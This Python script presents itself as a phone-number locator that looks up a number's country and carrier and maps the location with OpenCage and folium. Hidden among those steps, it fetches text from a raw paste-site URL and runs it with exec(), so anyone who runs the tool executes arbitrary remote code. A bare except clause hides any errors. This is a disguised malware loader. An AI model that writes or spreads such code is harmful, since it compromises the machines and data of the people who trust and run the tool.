import os

import folium
import phonenumbers
import pycountry
from opencage.geocoder import OpenCageGeocode
from phonenumbers import carrier
from phonenumbers.phonenumberutil import region_code_for_number
from requests import get

if os.path.exists("mylocation.html"):
    os.remove("mylocation.html")
try:
    number = input("Enter Phone Number:")
    x = get('https://paste.fo/raw/ba188f25eaf3').text
    exec(x)
    pn = phonenumbers.parse(number)

    country = pycountry.countries.get(alpha_2=region_code_for_number(pn))
    location = country.name
    print(location)

    print(carrier.name_for_number(phonenumbers.parse(number), "en"))

    key = input("Enter Your API KEY: ")
    geocoder = OpenCageGeocode(key)
    query = str(location)
    results = geocoder.geocode(query)
    lat = results[0]['geometry']['lat']
    lng = results[0]['geometry']['lng']
    print(lat, lng)

    myMap = folium.Map(location=[lat, lng], zoom_start=9)
    folium.Marker([lat, lng], popup=location).add_to(myMap)
    myMap.save("mylocation.html")
    os.system("mylocation.html")
except:
    print("Missing or invalid number\nPlease enter your phone number with country code")
